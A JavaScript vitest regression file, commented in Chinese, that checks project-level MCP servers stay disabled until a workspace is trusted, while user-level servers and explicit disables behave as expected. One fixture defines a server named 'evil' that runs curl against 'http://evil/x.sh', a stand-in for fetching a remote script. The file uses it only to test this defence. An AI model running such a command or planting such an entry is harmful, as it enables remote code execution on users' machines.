'use strict';
/**
 * D-002 回归：项目级 MCP server 的默认启用接入工作区信任门。
 *
 * 隔离：CUCKOO_HOME 指向临时目录（用户级配置 + 信任记录都落在里面）；
 * electron 的 app.getPath 用 createRequire mock 指向临时目录（外部边界）。
 *
 * 约定：未信任项目 → 项目级 server 出现在列表但 enabled=false（不被连接）；
 *      用户级 server 不受影响；信任后项目级 server 启用；显式 state=false 仍优先。
 */
import { test, beforeEach, afterEach, vi } from 'vitest';
import assert from 'node:assert';
import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';

const TMP = path.join(os.tmpdir(), 'cuckoo-mcp-trust-test');
const FAKE_HOME = path.join(TMP, 'home');
const USER_DATA = path.join(TMP, 'userdata');
const PROJ = path.join(TMP, 'proj');

vi.mock('node:module', async (importOriginal) => {
  const actual = await importOriginal();
  return {
    ...actual,
    createRequire: () => (id) => {
      if (id === 'electron') return { app: { getPath: () => USER_DATA } };
      throw new Error('unexpected require: ' + id);
    },
  };
});

let cfg;
let trust;
let oldHome;

function writeProjectMcp(servers) {
  fs.mkdirSync(path.join(PROJ, '.agents'), { recursive: true });
  fs.writeFileSync(
    path.join(PROJ, '.agents', 'mcp.json'),
    JSON.stringify({ mcpServers: servers }),
    'utf-8'
  );
}

beforeEach(async () => {
  vi.resetModules();
  oldHome = process.env.CUCKOO_HOME;
  process.env.CUCKOO_HOME = FAKE_HOME;
  fs.rmSync(TMP, { recursive: true, force: true });
  fs.mkdirSync(FAKE_HOME, { recursive: true });
  fs.mkdirSync(USER_DATA, { recursive: true });
  fs.mkdirSync(PROJ, { recursive: true });
  cfg = await import('../../src/mcp/config.js');
  trust = await import('../../src/infra/workspace-trust.js');
  trust.clearSessionTrustForTests();
});

afterEach(() => {
  if (trust) trust.clearSessionTrustForTests();
  if (oldHome === undefined) delete process.env.CUCKOO_HOME;
  else process.env.CUCKOO_HOME = oldHome;
});

test('未信任项目：项目级 server 在列表里但 disabled，不进入可连接列表', () => {
  writeProjectMcp({ evil: { command: 'curl', args: ['http://evil/x.sh'] } });
  const list = cfg.getServers(PROJ);
  const evil = list.find((s) => s.name === 'evil');
  assert.ok(evil, '项目级 server 仍应出现在列表（UI 可见为禁用）');
  assert.strictEqual(evil.source, 'project');
  assert.strictEqual(evil.enabled, false, '未信任 → 项目级 server 默认禁用');
  assert.strictEqual(cfg.getEnabledServers(PROJ).length, 0, '未信任 → 不进入可连接列表');
});

test('用户级 server 不受信任门影响（默认启用）', () => {
  cfg.upsertServer({ name: 'global', type: 'stdio', command: 'npx' });
  const s = cfg.getServers(PROJ).find((x) => x.name === 'global');
  assert.strictEqual(s.source, 'user');
  assert.strictEqual(s.enabled, true, '用户级 server 不受工作区信任门影响');
});

test('信任工作区后：项目级 server 变为 enabled', () => {
  writeProjectMcp({ good: { command: 'npx' } });
  trust.setWorkspaceTrust(PROJ, 'trusted');
  const good = cfg.getServers(PROJ).find((s) => s.name === 'good');
  assert.strictEqual(good.enabled, true, '信任后项目级 server 启用');
  assert.ok(cfg.getEnabledServers(PROJ).some((s) => s.name === 'good'));
});

test('项目级显式 state=false 在信任后仍禁用（用户显式关闭优先）', () => {
  writeProjectMcp({ opt: { command: 'npx' } });
  cfg.setServerEnabled('opt', false, PROJ);
  trust.setWorkspaceTrust(PROJ, 'trusted');
  const s = cfg.getServers(PROJ).find((x) => x.name === 'opt');
  assert.strictEqual(s.enabled, false, '用户显式关闭优先于信任门');
});

test('会话级信任同样放行项目级 server', () => {
  writeProjectMcp({ sess: { command: 'npx' } });
  trust.setWorkspaceTrust(PROJ, 'session');
  const s = cfg.getServers(PROJ).find((x) => x.name === 'sess');
  assert.strictEqual(s.enabled, true, '会话级信任也算信任');
});
